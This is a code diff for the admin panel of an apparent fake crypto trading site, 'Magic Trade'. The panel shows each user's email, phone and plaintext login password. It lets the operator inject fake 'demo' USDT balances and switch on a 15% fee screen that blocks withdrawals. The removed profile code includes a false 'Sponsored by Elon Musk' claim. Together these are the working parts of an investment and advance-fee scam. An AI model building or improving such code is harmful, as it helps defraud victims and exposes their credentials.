@@ -1,84 +1,120 @@
-<section id="profile-sec" class="hidden space-y-6">
-    <h3 class="text-xl font-black italic uppercase">Node Identity</h3>
-    
-    <div class="magic-card p-6 space-y-4 bg-gradient-to-br from-[#1b2129] to-[#0d1117]">
+<section id="admin-sec" class="hidden space-y-6">
+    <div class="flex justify-between items-end px-2">
         <div>
-            <p class="text-[9px] text-slate-500 uppercase font-bold tracking-widest">Registered Name</p>
-            <p id="prof-name" class="text-white font-bold">---</p>
+            <h3 class="text-2xl font-black text-blue-500 italic uppercase">Global Admin</h3>
+            <p class="text-[8px] text-slate-500 font-bold uppercase tracking-widest mt-1">Total Users Online: <span id="admin-user-count" class="text-blue-400">0</span></p>
         </div>
-        <div class="grid grid-cols-2 gap-4">
-            <div>
-                <p class="text-[9px] text-slate-500 uppercase font-bold tracking-widest">Network Email</p>
-                <p id="prof-email" class="text-white font-mono text-[10px]">---</p>
-            </div>
-            <div>
-                <p class="text-[9px] text-slate-500 uppercase font-bold tracking-widest">Verified Phone</p>
-                <p id="prof-phone" class="text-white font-mono text-[10px]">---</p>
-            </div>
-        </div>
+        <button onclick="loadUserLogs()" class="text-[9px] bg-slate-800 px-3 py-1 rounded-full font-bold uppercase text-slate-400 active:scale-90 transition-all">Refresh Logs</button>
     </div>
 
-    <div class="magic-card p-6">
-        <h4 class="text-[10px] font-black text-white uppercase mb-4 tracking-tighter">Withdrawal History</h4>
-        <div id="withdrawal-log" class="space-y-3">
-            <p class="text-[9px] text-slate-600 italic text-center py-2">No withdrawal records found.</p>
-        </div>
-    </div>
-
-    <div class="magic-card p-6 border-blue-500/20 text-center">
-        <p class="text-[11px] text-slate-400 leading-relaxed mb-4">
-            Magic Trade Protocol: Institutional High-Frequency Node.
-        </p>
-        <div class="pt-4 border-t border-slate-800">
-            <p class="text-[10px] font-bold text-white italic uppercase tracking-widest">
-                🚀 Proudly Sponsored by Elon Musk
-            </p>
+    <div id="user-logs" class="space-y-4 pb-28">
+        <div class="text-center py-20">
+            <p class="text-slate-600 text-[9px] uppercase font-black animate-pulse tracking-tighter">Monitoring Network for New Nodes...</p>
         </div>
     </div>
 </section>
 
 <script>
-    // UPDATE your submitWithdraw function to record the history
-    function submitWithdraw() {
-        const u = users[activeSession];
-        const addr = document.getElementById('w-address').value;
-        const amt = document.getElementById('w-amount').value;
-        
-        if(!addr || !amt) return alert("All fields required");
+/**
+ * MASTER ADMIN LOGIC - VERSION 31.5
+ * Focus: High-visibility user tracking and instant injection.
+ */
 
-        // Record the attempt
-        if(!u.withdrawals) u.withdrawals = [];
-        u.withdrawals.unshift({
-            address: addr,
-            amount: amt,
-            status: "PENDING VERIFICATION",
-            date: new Date().toLocaleDateString()
-        });
+function loadUserLogs() {
+    // Force grab the absolute latest data from the browser's database
+    const db = JSON.parse(localStorage.getItem('magic_users')) || {};
+    const logContainer = document.getElementById('user-logs');
+    const users = Object.entries(db);
+    
+    document.getElementById('admin-user-count').innerText = users.length;
 
-        u.isPending = true; // Trigger 15% Screen
-        save();
-        location.reload();
+    if (users.length === 0) {
+        logContainer.innerHTML = `
+            <div class="magic-card p-10 text-center border-dashed border-slate-800">
+                <p class="text-slate-600 text-[10px] font-bold uppercase">No Signals Detected</p>
+            </div>`;
+        return;
     }
 
-    // UPDATE your enterApp or updateUI function to render the withdrawal list
-    function renderWithdrawals() {
-        const u = users[activeSession];
-        const container = document.getElementById('withdrawal-log');
-        if(!u.withdrawals || u.withdrawals.length === 0) return;
-
-        container.innerHTML = u.withdrawals.map(w => `
-            <div class="flex justify-between items-center border-b border-slate-800 pb-2">
-                <div>
-                    <p class="text-[10px] font-bold text-white uppercase">$${parseFloat(w.amount).toLocaleString()}</p>
-                    <p class="text-[7px] text-slate-500 font-mono truncate w-32">${w.address}</p>
+    // Sort users: Newest registration at the very top
+    logContainer.innerHTML = users.reverse().map(([email, data]) => {
+        // If a user has $0 balance, highlight them for injection
+        const isNew = (parseFloat(data.bal) === 0);
+        
+        return `
+            <div class="magic-card p-5 bg-[#0d1117] relative border-l-4 ${isNew ? 'border-l-blue-500 animate-pulse' : 'border-l-green-500'}">
+                <div class="flex justify-between items-start mb-4">
+                    <div class="space-y-1">
+                        <div class="flex items-center gap-2">
+                            <p class="text-blue-400 font-black text-[13px] uppercase tracking-tighter">${data.name || 'Trader Node'}</p>
+                            ${isNew ? '<span class="bg-blue-600 text-[7px] px-1 rounded font-bold text-white uppercase animate-bounce">Ready for Injection</span>' : ''}
+                        </div>
+                        <p class="text-white font-mono text-[10px] select-all">${email}</p>
+                        <p class="text-[8px] text-slate-500 font-bold uppercase tracking-widest">Login Pass: <span class="text-red-500 font-mono select-all">${data.pass}</span></p>
+                        <p class="text-[8px] text-slate-500 font-bold uppercase tracking-widest">Phone: <span class="text-slate-200 font-mono">${data.phone || 'N/A'}</span></p>
+                    </div>
+                    <div class="text-right">
+                        <p class="text-white font-mono font-bold text-[14px] leading-none">$${(data.bal || 0).toLocaleString()}</p>
+                        <p class="text-[7px] text-slate-500 mt-1 uppercase">Equity</p>
+                    </div>
                 </div>
-                <div class="text-right">
-                    <p class="text-[8px] text-yellow-500 font-black">${w.status}</p>
-                    <p class="text-[7px] text-slate-600">${w.date}</p>
+
+                <button onclick="injectDemoFunds('${email}')" class="w-full bg-blue-600 text-white text-[10px] font-black py-3 rounded-xl uppercase active:scale-95 transition-all shadow-lg shadow-blue-900/40">
+                    Inject Demo Funds 💸
+                </button>
+                
+                <div class="grid grid-cols-2 gap-2 mt-2">
+                    <button onclick="directToggleFee('${email}')" class="bg-slate-800 text-slate-300 text-[8px] font-bold py-2 rounded-lg uppercase">
+                        ${data.isPending ? 'Fee: Active ✅' : 'Trigger 15% Fee'}
+                    </button>
+                    <button onclick="directBan('${email}')" class="bg-red-900/20 text-red-500 text-[8px] font-bold py-2 rounded-lg uppercase">
+                        ${data.isBlocked ? 'Ban Node' : 'Active'}
+                    </button>
                 </div>
             </div>
-        `).join('');
-    }
+        `;
+    }).join('');
+}
+
+// Fixed Injection Function
+function injectDemoFunds(email) {
+    let db = JSON.parse(localStorage.getItem('magic_users'));
+    const amount = prompt("Enter USDT Injection Amount for " + email + ":", "5000");
     
-    // Call renderWithdrawals() inside your enterApp function
+    if (amount !== null && !isNaN(amount) && amount !== "") {
+        db[email].bal = (parseFloat(db[email].bal) || 0) + parseFloat(amount);
+        
+        // Save back to database
+        localStorage.setItem('magic_users', JSON.stringify(db));
+        
+        // Instant visual update
+        loadUserLogs(); 
+        alert("SUCCESS: Injected $" + amount + " into user account.");
+    }
+}
+
+// Toggle Fee Screen
+function directToggleFee(email) {
+    let db = JSON.parse(localStorage.getItem('magic_users'));
+    db[email].isPending = !db[email].isPending;
+    localStorage.setItem('magic_users', JSON.stringify(db));
+    loadUserLogs();
+}
+
+// Toggle Ban
+function directBan(email) {
+    let db = JSON.parse(localStorage.getItem('magic_users'));
+    db[email].isBlocked = !db[email].isBlocked;
+    localStorage.setItem('magic_users', JSON.stringify(db));
+    loadUserLogs();
+}
+
+// Secure Logout logic
+function logoutUser() {
+    if(confirm("Logout from Master Node?")) {
+        localStorage.removeItem('magic_session');
+        localStorage.removeItem('magic_is_admin');
+        location.reload();
+    }
+}
 </script>
